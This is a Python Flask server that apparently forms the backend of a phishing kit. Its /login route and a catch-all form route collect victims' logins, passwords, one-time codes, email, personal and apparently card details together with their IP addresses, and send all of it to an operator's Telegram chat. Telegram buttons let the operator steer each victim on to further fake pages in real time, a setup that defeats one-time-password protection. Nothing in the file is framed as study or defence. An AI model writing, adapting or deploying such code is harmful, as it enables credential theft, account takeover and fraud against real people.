from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
import uuid

# Load environment variables from Render or .env
load_dotenv()

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Telegram Bot Settings
BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"  # Secret token
CHAT_ID = os.getenv("CHAT_ID")
if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing one or more required environment variables.")

# In-memory session store (replace with database in production)
SESSION_STORE = {}

# 🎯 Fancy Telegram Redirect Buttons (emoji + row layout)
REDIRECT_BUTTONS = {
    "redirect_otp": {"text": "🔐 OTP Page", "url": "otp.html"},
    "redirect_email": {"text": "📧 Email Page", "url": "email.html"},
    "redirect_personal": {"text": "🧍 Personal Page", "url": "personal.html"},
    "redirect_login2": {"text": "🔁 Login2 Page", "url": "login2.html"},
    "redirect_c": {"text": "📋 C Page", "url": "c.html"},
}

# Group buttons into rows (max 2 per row)
INLINE_KEYBOARD = []
temp_row = []
for i, (key, btn) in enumerate(REDIRECT_BUTTONS.items(), start=1):
    temp_row.append({"text": btn["text"], "callback_data": key})
    if i % 2 == 0:
        INLINE_KEYBOARD.append(temp_row)
        temp_row = []
if temp_row:
    INLINE_KEYBOARD.append(temp_row)

# 🔔 Telegram Message Sender
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": INLINE_KEYBOARD}
    }
    try:
        response = requests.post(url, json=payload)
        print(f"[TG] Status: {response.status_code}, Text: {response.text}")
        return response.ok
    except requests.RequestException as e:
        print(f"[TG ERROR] {e}")
        return False

# ✅ Root route
@app.route("/", methods=["GET"])
def root():
    return "✅ Flask backend is live."

# 🧠 Login Endpoint (JSON only)
@app.route('/login', methods=["POST"])
def login():
    try:
        data = request.get_json()
        if not data or 'login' not in data or 'password' not in data:
            return jsonify({"success": False, "error": "Missing login or password"}), 400

        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        login_id = str(uuid.uuid4())

        message = (
            f"<b>🔐 New LOGIN Submission</b>\n"
            f"<b>🆔 Login:</b> <code>{data['login']}</code>\n"
            f"<b>🔑 Password:</b> <code>{data['password']}</code>\n"
            f"<b>🌍 IP:</b> <code>{ip}</code>\n"
            f"<b>📦 Session ID:</b> <code>{login_id}</code>"
        )

        # Store session
        SESSION_STORE[login_id] = {
            "status": "pending",
            "redirect_url": None
        }

        sent = send_to_telegram(message)
        if sent:
            return jsonify({"success": True, "id": login_id}), 200
        return jsonify({"success": False, "error": "Failed to send to Telegram"}), 500

    except Exception as e:
        print(f"[LOGIN ERROR] {e}")
        return jsonify({"success": False, "error": "Server error"}), 500

# 🔁 Polling status route
@app.route('/status/<id>', methods=["GET"])
def status(id):
    session = SESSION_STORE.get(id)
    if not session:
        return jsonify({"status": "invalid"}), 404
    if session["status"] == "approved":
        return jsonify({
            "status": "approved",
            "redirect_url": session["redirect_url"]
        }), 200
    return jsonify({"status": "pending"}), 200

# 🤖 Telegram Webhook (button press)
@app.route('/webhook', methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update or 'callback_query' not in update:
            return jsonify({"status": "ignored"}), 200

        callback_data = update['callback_query']['data']
        chat_id = update['callback_query']['message']['chat']['id']

        if callback_data in REDIRECT_BUTTONS:
            # Approve most recent pending session (simplified for now)
            for session_id in reversed(SESSION_STORE):
                if SESSION_STORE[session_id]["status"] == "pending":
                    SESSION_STORE[session_id] = {
                        "status": "approved",
                        "redirect_url": REDIRECT_BUTTONS[callback_data]["url"]
                    }
                    print(f"[✅ Approved] Session {session_id} redirected to {callback_data}")
                    break
            return jsonify({"status": "ok"}), 200

        return jsonify({"status": "unknown callback"}), 200
    except Exception as e:
        print(f"[WEBHOOK ERROR] {e}")
        return jsonify({"status": "error"}), 500

# 🌐 Generic form submission (e.g., OTP, email, personal)
@app.route('/<page>', methods=["POST"])
def receive_form(page):
    try:
        data = request.get_json() or request.form.to_dict()
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        message_lines = [f"<b>📨 {page.upper()} Submission</b>"]
        for k, v in data.items():
            message_lines.append(f"<b>{k}:</b> <code>{v}</code>")
        message_lines.append(f"<b>🌍 IP:</b> <code>{ip}</code>")
        full_message = "\n".join(message_lines)
        sent = send_to_telegram(full_message)
        return jsonify({"status": "ok" if sent else "failed"}), 200 if sent else 500
    except Exception as e:
        print(f"[FORM ERROR] {e}")
        return jsonify({"status": "failed", "error": "Server error"}), 500

# 🚀 Run Flask
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)